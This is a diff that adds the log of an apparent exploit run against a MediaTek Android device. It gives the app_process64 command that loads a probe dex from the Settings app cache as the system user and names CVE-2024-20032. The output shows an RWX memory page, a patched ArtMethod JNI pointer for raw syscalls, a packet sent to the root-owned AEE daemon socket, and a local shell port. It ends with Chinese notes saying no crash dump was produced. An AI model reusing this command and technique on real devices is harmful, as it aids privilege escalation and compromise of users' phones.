@@ -1,0 +1,43 @@
+command=CLASSPATH=/data/data/com.android.settings/cache/apusys_ioctl_probe.dex app_process64 /system/bin AeeSessionProbe --socket=com.mtk.aee.aed_64 --ind=11 --class=4 --payload
+probe=aee-session
+dex_md5=75cf54f9bd2768bcb7cd30c93f961e0b
+dex_sha256=51786ae21dc8160b4963ef5037017e091603259ab4652b74a180fe7f5aa1141a
+remote_dex=/data/data/com.android.settings/cache/apusys_ioctl_probe.dex
+shell_port=127.0.0.1:48888
+exit_status=0
+
+uid=1000(system) gid=1000(system) groups=1000(system),3003(inet) context=u:r:system_app:s0
+u:r:system_app:s0
+75cf54f9bd2768bcb7cd30c93f961e0b  /data/data/com.android.settings/cache/apusys_ioctl_probe.dex
+[AeeSessionProbe] CVE-2024-20032 session driver
+[AeeSessionProbe] uid=1000 pid=26886 target_pid=26886 class=4 ind=11 flags=0x0 payload=true
+[+] Scratch buffer at 0x7de52ed000
+[*] Trying anonymous PROT_RWX mmap...
+[+] Anonymous RWX page at 0x7de52c0000
+[+] Wrote syscall stub: JNI@+0x00 (36B), call stub JNI@+0x80 (40B); entry_point left untouched
+[*] ArtMethod for nativeSyscall at 0x7de0408c88
+    access_flags = 0x10000108 [NATIVE]
+    data (JNI ptr) = 0x7b3621a2c0
+    entry_point    = 0x1038000875efc578
+[*] Patching data_ (JNI) → 0x7de52c0000
+    data_       = 0x7de52c0000 ✓
+    entry_point = 0x1038000875efc578 (unchanged)
+[+] ArtMethod patched
+[+] Syscall infrastructure ready
+
+[session] @com.mtk.aee.aed_64 connected peer_uid=0
+[session] IND ind=11 class=4 pid=26886 flags=0x0 payload=18
+[session] IND bytes: 02 00 00 00 0b 00 00 00 06 69 00 00 04 00 00 00 12 00 00 00 00 00 00 00
+[session] daemon closed connection after 0 reqs (normal — session complete, waiting for aee_dumpstate...)
+[session] no REQs on @com.mtk.aee.aed_64 (daemon may need crash state)
+
+[phase-check] /data/vendor/aee_exp/
+[dump_check] 开始轮询转储目录（最多45秒）...
+[dump_check] /data/vendor/aee_exp: 0 个已有条目
+[dump_check] /data/vendor/core: 0 个已有条目
+[dump_check] /data/vendor/dumpsys: 0 个已有条目
+[dump_check] /data/tombstones: 0 个已有条目
+[dump_check] /data/anr: 3 个已有条目
+[result] DUMP_WRITTEN=NO — 45秒内所有候选目录无新文件
+  可能原因: aee_dumpstate 无法 ptrace 目标进程，
+  或写入路径不在 system_app 可读范围内。
